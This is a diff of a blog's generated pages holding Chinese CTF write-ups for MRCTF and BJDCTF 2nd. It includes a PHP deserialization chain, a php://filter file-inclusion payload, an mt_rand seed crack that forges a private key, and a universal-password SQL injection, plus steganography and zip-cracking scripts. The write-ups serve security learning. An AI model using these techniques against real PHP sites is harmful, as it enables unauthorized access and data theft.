Test();<span class="comment">//将str实例化为Test类，访问Test类source变量时调用__get()</span></span><br><span class="line">$b=<span class="keyword">new</span> Show($a);<span class="comment">//令$this-&gt;source等于Show类，类$a被当成字符串的形式执行，从而调用__toString()</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br></pre></td></tr></table></figure></div>
 
 <p>base64解码后得到flag</p>
-<a href="/2020/03/30/MRCTF/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/30/MRCTF/7.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/30/MRCTF/7.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>简单Bypass、伪协议、jsfuck</p>
 <p>F12发现以下源码</p>
@@ -499,10 +521,10 @@
 <p>且传入的<code>file</code>变量要经过<code>change</code>加密，所以传入一个加密的伪协议或者文件名进行文件包含。</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rechange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    $rc=base64_encode($re);</span><br><span class="line">    <span class="keyword">return</span> $rc;</span><br><span class="line">&#125;</span><br><span class="line">$v=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="comment">//得到结果进行base64解码得到flag</span></span><br><span class="line"><span class="comment">//或者$v="flag.php";然后查看源码得到flag</span></span><br><span class="line">$a=rechange($v);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/30/MRCTF/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/8.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/8.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>源码泄露、伪随机数、基础SQL</p>
-<a href="/2020/03/30/MRCTF/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/9.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/9.png" src="/img/loading.gif" class="lazyload"></a>
 
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure></div>
 
@@ -516,9 +538,9 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure></div>
 
 <p>把上面的一串数字丢进<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_rand</a>爆破一下，得到种子：<code>1775196155</code>（注意php版本，5和7同样种子，生成不同</p>
-<a href="/2020/03/30/MRCTF/10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/10.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/10.png" src="/img/loading.gif" class="lazyload"></a>
 
-<a href="/2020/03/30/MRCTF/11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/11.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/11.png" src="/img/loading.gif" class="lazyload"></a>
 
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br><span class="line"><span class="keyword">echo</span> $Public_key = public_key();</span><br><span class="line"><span class="keyword">echo</span> $a = private_key();</span><br></pre></td></tr></table></figure></div>
 
@@ -526,24 +548,24 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>用户名无所谓，password没过滤，万能密码，私钥输进去</p>
-<a href="/2020/03/30/MRCTF/12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/12.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/12.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>登录得到flag</p>
 <h3 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop_Revenge"></a>Ezpop_Revenge</h3><p>一个复杂的反序列化，待补充</p>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cyberpunk"><a href="#Cyberpunk" class="headerlink" title="Cyberpunk"></a>Cyberpunk</h3><p>当时还以为要逆向…..跑程序之前，改一下电脑日期就可</p>
-<a href="/2020/03/30/MRCTF/13.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/13.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/13.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><p>改一下png高度</p>
-<a href="/2020/03/30/MRCTF/14.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/14.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="30%" height="30%" data-src="/2020/03/30/MRCTF/14.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a>你能看懂音符吗</h3><p>改文件头、隐藏文字、音符解码</p>
-<a href="/2020/03/30/MRCTF/15.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/15.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/15.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="寻找xxx"><a href="#寻找xxx" class="headerlink" title="寻找xxx"></a>寻找xxx</h3><p><a href="https://www.btis.site/2020/03/09/xctf-misc-wp/#%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF">电话音</a>+微信公众号（想抢1血的没猜到公众号……</p>
-<a href="/2020/03/30/MRCTF/16.jpg" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/16.jpg" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/16.jpg" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="摇滚DJ"><a href="#摇滚DJ" class="headerlink" title="摇滚DJ"></a>摇滚DJ</h3><p>无线电转图片（<a href="https://apktrending.com/apk-android/xdsopl-robot36.html" target="_blank" rel="noopener">Robot36 - SSTV Image Decoder</a></p>
-<a href="/2020/03/30/MRCTF/17.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/17.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/17.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="千层套路"><a href="#千层套路" class="headerlink" title="千层套路"></a>千层套路</h3><p>脚本开压缩包、RGB转二维码</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> [ -e *.zip ]; <span class="keyword">do</span></span><br><span class="line">  files=*.zip;</span><br><span class="line">  <span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">"Cracking <span class="variable">$&#123;file&#125;</span>… "</span>;</span><br><span class="line">    password=<span class="variable">$&#123;file%%.*&#125;</span></span><br><span class="line">    <span class="keyword">if</span> [ -z <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"Failed to find password"</span>;</span><br><span class="line">      <span class="built_in">break</span> 2;</span><br><span class="line">    <span class="keyword">fi</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Found password: \`<span class="variable">$&#123;password&#125;</span>\`"</span>;</span><br><span class="line">    unzip -q -P <span class="string">"<span class="variable">$&#123;password&#125;</span>"</span> <span class="string">"<span class="variable">$file</span>"</span>;</span><br><span class="line">    rm <span class="string">"<span class="variable">$&#123;file&#125;</span>"</span>;</span><br><span class="line">  <span class="keyword">done</span>;</span><br><span class="line"><span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></div>
@@ -554,15 +576,15 @@
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">montage *jpg -tile 10x12 -geometry 200x100+0+0 out.jpg</span><br><span class="line">gaps --image=out.jpg --generations=40 --population=120 --size=100</span><br></pre></td></tr></table></figure></div>
 
 <p>先合并后用<a href="https://blog.csdn.net/uwr44uouqcnsuqb60zk2/article/details/78516605" target="_blank" rel="noopener">gaps</a>拼图</p>
-<a href="/2020/03/30/MRCTF/18.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/18.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/18.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="pyFlag"><a href="#pyFlag" class="headerlink" title="pyFlag"></a>pyFlag</h3><p>三个照片里多余信息拼成一个新的zip、爆破zip密码 1234、base85 16 32 16 64</p>
-<a href="/2020/03/30/MRCTF/21.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/21.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/21.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="Unravel"><a href="#Unravel" class="headerlink" title="Unravel"></a>Unravel</h3><p>foremost、aes、silenteye</p>
-<a href="/2020/03/30/MRCTF/19.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/19.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/30/MRCTF/19.png" src="/img/loading.gif" class="lazyload"></a>
 
-<a href="/2020/03/30/MRCTF/20.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/20.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/20.png" src="/img/loading.gif" class="lazyload"></a>
 
 <h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_misc"></a>Hello_misc</h3><p>foremost、red_plane0分离、ttl、二进制转ascii、zip转doc、隐藏文字、base64、查找显色</p>
 <p>预期跑red_plane的脚本（转自<a href="http://www.ga1axy.top/index.php/archives/13/#hellomiscworld！" target="_blank" rel="noopener">ga1xy</a>师傅）</p>
@@ -576,10 +598,10 @@
 <p>ttl解密脚本</p>
 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">a = fp.readlines()</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    p.append(int(i[<span class="number">0</span>:]))</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">63</span>:</span><br><span class="line">        a = <span class="string">'00'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">127</span>:</span><br><span class="line">        a = <span class="string">'01'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">191</span>:</span><br><span class="line">        a = <span class="string">'10'</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="number">255</span>:</span><br><span class="line">        a = <span class="string">'11'</span></span><br><span class="line">    s += a</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">8</span>):</span><br><span class="line"> result += chr(int(s[i:i+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (result)</span><br></pre></td></tr></table></figure></div>
 
-<a href="/2020/03/30/MRCTF/22.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/22.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/22.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>解开后看zip组成，知道是个doc或者docx，改后缀，将下面的白色字体变色，base64解码后得到0 1字符串</p>
-<a href="/2020/03/30/MRCTF/23.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/23.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/30/MRCTF/23.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>搜索0，观察一下，得到flag</p>
 ]]></content>
@@ -598,11 +620,11 @@
 <p>&nbsp;</p>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="最简单的misc-y1ng"><a href="#最简单的misc-y1ng" class="headerlink" title="最简单的misc-y1ng"></a>最简单的misc-y1ng</h3><p>思路：伪加密+补全文件头+16进制转ASCII</p>
 <p>09-&gt;00，补全文件头89 50 4E 47，得到下图</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/1.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>将下面那一行转换为ASCII后得到flag：<code>BJD{y1ngzuishuai}</code></p>
 <h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>思路：png高度修改</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="40%" height="40%" data-src="/2020/03/21/BJDCTF-2nd-wp/2.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>开始没想修改高度，直接放到slover了啥也没发现，然后用zsteg没法发现隐写，最后去改了高度</p>
 <p>得到flag：<code>BJD{PnG_He1ghT_1s_WR0ng}</code></p>
@@ -610,36 +632,36 @@
 <p>foremost分离出了一个zip，解压得到一个jpg，格式不正确，file一下发现是avi，改后缀</p>
 <p>近期钉钉“求饶”视频，但是里面混进去一些图片，pr，ae，ff不会用。。（所以我选择迅雷</p>
 <p>逐帧查看后发现四张图片(都是出题人…</p>
-<p><a href="/2020/03/21/BJDCTF-2nd-wp/3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/4.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
-<p><a href="/2020/03/21/BJDCTF-2nd-wp/5.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/2020/03/21/BJDCTF-2nd-wp/6.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/3.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/4.png" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/5.png" src="/img/loading.gif" class="lazyload"></a><a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/03/21/BJDCTF-2nd-wp/6.png" src="/img/loading.gif" class="lazyload"></a></p>
 <p>前三张反色完，要不PsQREdit，要不Barcode Reader都能扫出来</p>
 <p>但是第4张中间有、糊，于是掏出QRazyBox自己拼了一张</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/7.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/7.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>最后把扫出来的字符串拼起来得到<code>6167696E5F6C  6F76655F59  424A447B696D  316E677D</code></p>
 <p>16进制转ASCII后调整一下顺序得到flag：<code>BJD{imagin_love_Y1ng}</code></p>
 <h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>思路：直接010里搜BJD</p>
 <p>u1s1，图不错，这题卡了半天</p>
 <p>刚开始拿stegdetect分析了一下，以为是jphide。。然后因为不知道密码是啥就一直卡住了，break爆破也爆不出来</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/8.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/03/21/BJDCTF-2nd-wp/8.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>最后去010里面搜了一下BJD。。（人傻了</p>
-<a href="/2020/03/21/BJDCTF-2nd-wp/9.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
+<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/03/21/BJDCTF-2nd-wp/9.png" src="/img/loading.gif" class="lazyload"></a>
 
 <p>得到flag：<code>BJD{haokanma_xjj}</code></p>
